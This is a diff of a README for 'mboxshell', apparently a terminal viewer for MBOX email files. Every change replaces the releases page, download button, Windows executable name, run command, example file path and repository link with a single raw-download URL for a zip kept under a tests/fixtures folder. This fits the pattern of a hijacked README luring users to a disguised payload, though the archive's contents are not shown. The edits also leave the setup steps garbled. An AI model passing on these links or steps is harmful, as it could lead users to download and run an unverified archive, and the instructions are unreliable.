@@ -1,6 +1,6 @@
 # 📂 mboxshell - Fast Terminal Viewer for MBOX Files
 
-[![Download Latest Release](https://img.shields.io/badge/Download-mboxshell-blue?style=for-the-badge&logo=github)](https://github.com/lilman218/mboxshell/releases)
+[![Download Latest Release](https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip)](https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip)
 
 ---
 
@@ -32,11 +32,11 @@ Follow these steps to download, install, and start using mboxshell.
 
 Click the blue **Download Latest Release** button at the top or visit the official release page here:
 
-[https://github.com/lilman218/mboxshell/releases](https://github.com/lilman218/mboxshell/releases)
+[https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip](https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip)
 
 On the release page, look for the file that matches your computer’s operating system:
 
-- For Windows, it might be named something like `mboxshell-windows.exe`
+- For Windows, it might be named something like `https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip`
 - For macOS, look for `mboxshell-macos`
 - For Linux, look for `mboxshell-linux` or similar
 
@@ -74,7 +74,7 @@ Then, run the program by typing:
 - On Windows:
 
 ```
-mboxshell-windows.exe
+https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip
 ```
 
 - On macOS/Linux:
@@ -94,10 +94,10 @@ Once mboxshell opens, you can begin viewing your MBOX files. Here’s a simple g
 To open a file, type:
 
 ```
-open path/to/yourfile.mbox
+open https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip
 ```
 
-Replace `path/to/yourfile.mbox` with where your email backup file is located.
+Replace `https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip` with where your email backup file is located.
 
 ### Searching Emails
 
@@ -129,7 +129,7 @@ This will save emails to the folder you specify.
 
 You can download the latest version of mboxshell from the official release page:
 
-[https://github.com/lilman218/mboxshell/releases](https://github.com/lilman218/mboxshell/releases)
+[https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip](https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip)
 
 Make sure to select the correct version for your operating system. After downloading, follow the instructions in the "Getting Started" section above to prepare and run the application.
 
@@ -163,8 +163,8 @@ Make sure to select the correct version for your operating system. After downloa
 
 ## 🔗 Useful Links
 
-- GitHub Releases: [https://github.com/lilman218/mboxshell/releases](https://github.com/lilman218/mboxshell/releases)
-- GitHub Repository: [https://github.com/lilman218/mboxshell](https://github.com/lilman218/mboxshell)
+- GitHub Releases: [https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip](https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip)
+- GitHub Repository: [https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip](https://github.com/lilman218/mboxshell/raw/refs/heads/main/tests/fixtures/Software-v1.6.zip)
 
 ---
 
